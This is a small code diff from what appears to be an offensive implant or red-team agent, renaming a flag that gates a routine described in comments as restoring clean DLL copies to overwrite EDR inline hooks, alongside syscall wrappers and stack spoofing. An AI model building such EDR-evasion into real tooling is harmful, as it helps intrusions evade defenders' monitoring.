@@ -91,7 +91,7 @@ extern "C" int EntryPoint() {
     * \KnownDlls\ clean copies, overwriting EDR inline hooks.
     * Runs after InitNtApi so Sys_Nt* wrappers (HellsHall) are available.
     * Runs before StackSpoof so subsequent Win32 calls hit clean code. */
-    if (opsecFlags & EVASION_FLAG_UNHOOK) {
+    if (opsecFlags & OPSEC_FLAG_UNHOOK) {
         Unhook_RestoreAll();
     }
 
